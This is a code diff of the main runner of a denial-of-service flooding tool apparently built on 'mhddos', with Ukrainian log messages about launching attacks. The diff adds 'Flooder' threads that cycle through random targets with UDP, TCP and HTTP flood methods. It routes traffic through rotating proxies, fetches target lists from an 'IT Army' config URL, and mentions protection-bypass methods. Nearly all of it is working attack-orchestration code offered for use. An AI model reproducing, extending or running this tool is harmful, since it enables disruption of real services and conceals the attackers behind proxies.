@@ -1,135 +1,200 @@
 # @formatter:off
 import colorama; colorama.init()
 # @formatter:on
-import queue
-from collections import namedtuple
-from concurrent.futures import Future, Executor
-from concurrent.futures.thread import _WorkItem
-from threading import Thread, Event, stack_size
-from time import sleep, time
+from itertools import cycle
+from queue import SimpleQueue
+import random
+import time
+from threading import Event, Thread, stack_size
+from typing import Any, Generator, List
 
 from src.cli import init_argparse
-from src.core import logger, cl, UDP_THREADS, LOW_RPC, IT_ARMY_CONFIG_URL
+from src.concurrency import DaemonThreadPool
+from src.core import (
+    logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED,
+    DNS_WORKERS, Params, Stats, PADDING_THREADS, ONLY_MY_IP
+)
 from src.dns_utils import resolve_all_targets
 from src.mhddos import main as mhddos_main
-from src.output import AtomicCounter, show_statistic, print_banner, print_progress
-from src.proxies import update_proxies
+from src.output import show_statistic, print_banner, print_progress
+from src.proxies import update_proxies, NoProxy
 from src.system import fix_ulimits, is_latest_version
 from src.targets import Targets
 
 
 stack_size(512*1024)
 
-Params = namedtuple('Params', 'target, method, threads')
+def cycle_shuffled(container: List[Any]) -> Generator[Any, None, None]:
+    ind = list(range(len(container)))
+    random.shuffle(ind)
+    for next_ind in cycle(ind):
+        yield container[next_ind]
 
-PAD_THREADS = 30
 
-TERMINATE = object()
+class Flooder(Thread):
+    def __init__(self, switch_after: int = WORK_STEALING_DISABLED):
+        super(Flooder, self).__init__(daemon=True)
+        self._switch_after = switch_after
+        self._queue = SimpleQueue()
 
+    def enqueue(self, event, args_list):
+        self._queue.put((event, args_list))
+        return self
 
-class DaemonThreadPool(Executor):
-    def __init__(self):
-        self._queue = queue.SimpleQueue()
+    def run(self):
+        """
+        The logic here is the following:
 
-    def start(self, num_threads):
-        threads_started = num_threads
-        for cnt in range(num_threads):
-            try:
-                Thread(target=self._worker, daemon=True).start()
-            except RuntimeError:
-                for _ in range(PAD_THREADS):
-                    self._queue.put(TERMINATE)
-                threads_started = cnt - PAD_THREADS
-                if threads_started <= 0:
-                    logger.warning(f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
-                    exit()
-                logger.warning(
-                    f'{cl.RED}Не вдалося запустити усі {num_threads} потоків - лише {threads_started}{cl.RESET}'
-                )
-                break
-        return threads_started
+         1) pick up random target to attack
+         2) run a single session, receive back number of packets being sent
+         3) if session was "succesfull" (non zero packets), keep executing for
+            {switch_after} number of cycles
+         4) otherwise, go back to 1)
 
-    def submit(self, fn, *args, **kwargs):
-        f = Future()
-        w = _WorkItem(f, fn, args, kwargs)
-        self._queue.put(w)
-        return f
+        The idea is that if a specific target doesn't work, the thread will
+        pick another work to do (steal). The definition of "success" could be
+        extended to cover more use cases.
 
-    def _worker(self):
+        As an attempt to steal work happens after fixed number of cycles,
+        one should be careful with the configuration. If each cycle takes too
+        long (for example BYPASS or DBG attacks are used), the number should
+        be set to be relatively small.
+
+        To dealing stealing, set number of cycles to -1. Such scheduling will
+        be equivalent to the scheduling that was used before the feature was
+        introduced (static assignment).
+        """
         while True:
-            work_item = self._queue.get(block=True)
-            if work_item is TERMINATE:
-                return
+            event, args_list = self._queue.get()
+            event.wait()
+            time.sleep(random.random())  # make sure all operations are desynchornized
+            kwargs_iter = cycle_shuffled(args_list)
+            while event.is_set():
+                kwargs = next(kwargs_iter)
+                runnable = mhddos_main(**kwargs)
+                no_switch = self._switch_after == WORK_STEALING_DISABLED
+                alive, cycles_left = True, self._switch_after
+                while event.is_set() and (no_switch or alive):
+                    try:
+                        alive = runnable.run() > 0 and cycles_left > 0
+                    except Exception:
+                        alive = False
+                    cycles_left -= 1
 
-            if work_item is not None:
-                work_item.run()
-                del work_item
+
+def run_flooders(num_threads, switch_after) -> List[Flooder]:
+    threads = []
+    for _ in range(num_threads):
+        flooder = Flooder(switch_after)
+        try:
+            flooder.start()
+            threads.append(flooder)
+        except RuntimeError:
+            break
+
+    if not threads:
+        logger.error(
+            f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
+        exit()
+
+    if len(threads) < num_threads:
+        logger.warning(
+            f"{cl.RED}Не вдалося запустити усі {num_threads} потоків - "
+            f"лише {len(threads)}{cl.RESET}")
+
+    return threads
 
 
-def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_methods, vpn_mode, debug, table):
-    threads_per_target = total_threads // len(targets)
-    params_list = []
-    for target in targets:
-        assert target.is_resolved, "Unresolved target cannot be used for attack"
-        # udp://, method defaults to "UDP"
-        if target.is_udp:
-            params_list.append(Params(target, target.method or 'UDP', UDP_THREADS))
-        # Method is given explicitly
-        elif target.method is not None:
-            params_list.append(Params(target, target.method, threads_per_target))
-        # tcp://
-        elif target.url.scheme == "tcp":
-            params_list.append(Params(target, 'TCP', threads_per_target))
-        # HTTP(S), methods from --http-methods
-        elif target.url.scheme in {"http", "https"}:
-            threads = threads_per_target // len(http_methods)
-            for method in http_methods:
-                params_list.append(Params(target, method, threads))
-        else:
-            raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
+def run_ddos(
+    proxies,
+    targets,
+    tcp_flooders,
+    udp_flooders,
+    period,
+    rpc,
+    http_methods,
+    use_my_ip,
+    debug,
+    table,
+):
+    statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []
 
-    logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
-    statistics = {}
-    event = Event()
-    event.set()
-    for params in params_list:
-        thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
+    def get_proxy():
+        if use_my_ip == ONLY_MY_IP:
+            return NoProxy
+        if use_my_ip != 0 and random.random() * 100 <= use_my_ip:
+            return NoProxy
+        return random.choice(proxies)
+
+    def register_params(params, container):
+        thread_statistics = Stats()
         statistics[params] = thread_statistics
         kwargs = {
             'url': params.target.url,
             'ip': params.target.addr,
             'method': params.method,
-            'threads': params.threads,
             'rpc': int(params.target.option("rpc", "0")) or rpc,
-            'thread_pool': thread_pool,
             'event': event,
-            'statistics': thread_statistics,
-            'proxies': proxies,
+            'stats': thread_statistics,
+            'get_proxy': get_proxy,
         }
-        mhddos_main(**kwargs)
-        if not table:
+        container.append(kwargs)
+        if not (table or debug):
             logger.info(
-                f"{cl.YELLOW}Атакуємо{cl.BLUE} %s{cl.YELLOW} методом{cl.BLUE} %s{cl.YELLOW}, потоків:{cl.BLUE} %d{cl.YELLOW}!{cl.RESET}"
-                % (params.target.url.host, params.method, params.threads))
+                f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
+                % (params.target.url.host, params.target.url.port, params.method)
+            )
+
+    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
+    if not (table or debug):
+        # Keep the docs/info on-screen for some time before outputting the logger.info above
+        time.sleep(5)
+
+    for target in targets:
+        assert target.is_resolved, "Unresolved target cannot be used for attack"
+        # udp://, method defaults to "UDP"
+        if target.is_udp:
+            register_params(Params(target, target.method or 'UDP'), udp_kwargs_list)
+        # Method is given explicitly
+        elif target.method is not None:
+            register_params(Params(target, target.method), kwargs_list)
+        # tcp://
+        elif target.url.scheme == "tcp":
+            register_params(Params(target, 'TCP'), kwargs_list)
+        # HTTP(S), methods from --http-methods
+        elif target.url.scheme in {"http", "https"}:
+            for method in http_methods:
+                register_params(Params(target, method), kwargs_list)
+        else:
+            raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
+
+    for flooder in tcp_flooders:
+        flooder.enqueue(event, kwargs_list)
+
+    if udp_kwargs_list:
+        for flooder in udp_flooders:
+            flooder.enqueue(event, udp_kwargs_list)
+
+    event.set()
 
     if not (table or debug):
-        print_progress(period, 0, len(proxies))
-        sleep(period)
+        print_progress(period, len(proxies), use_my_ip)
+        time.sleep(period)
     else:
-        ts = time()
-        refresh_rate = 4 if table else 2
-        sleep(refresh_rate)
+        cycle_start = time.perf_counter()
         while True:
-            passed = time() - ts
+            time.sleep(5)
+            passed = time.perf_counter() - cycle_start
             if passed > period:
                 break
-            show_statistic(statistics, refresh_rate, table, vpn_mode, len(proxies), period, passed)
-            sleep(refresh_rate)
+            show_statistic(statistics, table, use_my_ip, len(proxies), round(period - passed))
+
     event.clear()
 
 
 def start(args):
-    print_banner(args.vpn_mode)
+    use_my_ip = min(args.use_my_ip, ONLY_MY_IP)
+    print_banner(use_my_ip)
     fix_ulimits()
 
     if args.table:
@@ -137,13 +202,8 @@ def start(args):
 
     for bypass in ('CFB', 'DGB'):
         if bypass in args.http_methods:
-            logger.warning(
-                f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
-                f'за замовчуванням може бути ефективніша{cl.RESET}'
-            )
+            logger.warning(f'{cl.RED}Робота методу {bypass} не гарантована{cl.RESET}')
 
-    thread_pool = DaemonThreadPool()
-    total_threads = thread_pool.start(args.threads)  # It is possible that not all threads were started
     if args.itarmy:
         targets_iter = Targets([], IT_ARMY_CONFIG_URL)
     else:
@@ -151,9 +211,21 @@ def start(args):
 
     proxies = []
     is_old_version = not is_latest_version()
+
+    # padding threads are necessary to create a "safety buffer" for the
+    # system that hit resources limitation when running main pools.
+    # it will be deallocated as soon as all other threads are up and running.
+    padding_threads = DaemonThreadPool(PADDING_THREADS).start_all()
+    dns_executor = DaemonThreadPool(DNS_WORKERS).start_all()
+    udp_flooders = run_flooders(args.udp_threads, WORK_STEALING_DISABLED)
+    tcp_flooders = run_flooders(args.threads, args.switch_after)
+    padding_threads.terminate_all()
+    del padding_threads
+
     while True:
         if is_old_version:
-            print(f'{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')
+            print(
+                f'{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')
 
         while True:
             targets = list(targets_iter)
@@ -161,38 +233,42 @@ def start(args):
                 logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
                 exit()
 
-            targets = resolve_all_targets(targets, thread_pool)
+            targets = resolve_all_targets(targets, dns_executor)
             targets = [target for target in targets if target.is_resolved]
             if targets:
                 break
             else:
-                logger.warning(f'{cl.RED}Не знайдено жодної доступної цілі - чекаємо 30 сек до наступної перевірки{cl.RESET}')
-                sleep(30)
+                logger.warning(
+                    f'{cl.RED}Не знайдено жодної доступної цілі - чекаємо 30 сек до наступної перевірки{cl.RESET}')
+                time.sleep(30)
 
         if args.rpc < LOW_RPC:
             logger.warning(
-                f'{cl.RED}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
+                f'{cl.YELLOW}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
                 f'через збільшення кількості перепідключень{cl.RESET}'
             )
 
-        no_proxies = args.vpn_mode or all(target.is_udp for target in targets)
-        if no_proxies:
+        current_use_my_ip = use_my_ip
+        if all(target.is_udp for target in targets):
+            current_use_my_ip = ONLY_MY_IP
+
+        if current_use_my_ip == ONLY_MY_IP:
             proxies = []
         else:
-            proxies = update_proxies(args.proxies, proxies)
+            proxies = list(update_proxies(args.proxies, proxies))
 
         period = 300
         run_ddos(
-            thread_pool,
             proxies,
             targets,
-            total_threads,
+            tcp_flooders,
+            udp_flooders,
             period,
             args.rpc,
             args.http_methods,
-            args.vpn_mode,
+            current_use_my_ip,
             args.debug,
-            args.table
+            args.table,
         )
 
 
